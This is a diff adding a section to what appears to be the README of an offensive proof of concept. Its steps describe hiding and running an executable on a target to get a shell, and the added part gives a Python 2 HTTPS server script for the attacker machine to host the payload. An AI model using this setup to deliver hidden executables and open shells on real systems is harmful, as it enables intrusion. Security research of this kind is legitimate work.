@@ -114,4 +114,27 @@ Since this is only a POC, as usual, not covering techniques are implemented, to 
 1. The exe file is hidden and executed
 1. I got a shell on the attacker machine
 
+So first of all set a HTTPS web server on the attacker machine, of course we can use a Python script:<br>
+<code>
+#!/usr/bin/python2
+# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
+# generate server.xml with the following command:
+#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
+# run as follows:
+#    python simple-https-server.py
+# then in your browser, visit:
+#    https://192.168.1.11:4443
+
+import BaseHTTPServer, SimpleHTTPServer
+import ssl
+import sys
+
+if len(sys.argv) > 1:
+    httpd = BaseHTTPServer.HTTPServer((sys.argv[1], 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
+    httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
+    httpd.serve_forever()    
+else:
+    print "You must pass the local IP address to bind: " + sys.argv[0] + " 192.168.1.11"
+
+</code>
 
